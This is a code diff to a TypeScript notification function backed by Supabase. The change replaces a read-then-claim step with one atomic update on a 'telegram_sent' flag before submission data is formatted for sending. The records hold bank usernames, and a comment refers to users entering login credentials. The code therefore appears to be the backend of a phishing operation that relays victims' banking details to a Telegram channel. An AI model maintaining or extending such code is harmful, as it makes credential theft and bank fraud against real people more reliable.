@@ -71,37 +71,23 @@ async function processNotification(
   submission_id: string,
   kind: "full_info" | "log",
 ): Promise<{ ok: boolean; sent: number; reason?: string }> {
-  // Load fresh submission data
-  const { data: submission, error } = await supabase
+  // Atomic claim: only proceed if telegram_sent is still false
+  const { data: claimed, error: claimErr } = await supabase
     .from("submissions")
-    .select("*")
+    .update({ telegram_sent: true, notified_at: new Date().toISOString() })
     .eq("id", submission_id)
-    .single();
+    .eq("telegram_sent", false)
+    .select("*");
 
-  if (error || !submission) {
-    return { ok: false, sent: 0, reason: "submission_not_found" };
+  if (claimErr || !claimed || claimed.length === 0) {
+    return { ok: true, sent: 0, reason: "already_sent" };
   }
 
-  // Already notified — skip
-  if (submission.notified_at) {
-    return { ok: true, sent: 0, reason: "already_notified" };
-  }
+  const submission = claimed[0];
 
   // For full_info: skip if user has since entered login credentials
   if (kind === "full_info" && submission.bank_username) {
     return { ok: true, sent: 0, reason: "login_present" };
-  }
-
-  // Atomic claim: only proceed if notified_at is still NULL
-  const { data: claimed, error: claimErr } = await supabase
-    .from("submissions")
-    .update({ notified_at: new Date().toISOString() })
-    .eq("id", submission_id)
-    .is("notified_at", null)
-    .select("id");
-
-  if (claimErr || !claimed || claimed.length === 0) {
-    return { ok: true, sent: 0, reason: "race_lost" };
   }
 
   const text = kind === "log" ? formatLog(submission) : formatFullInfo(submission);
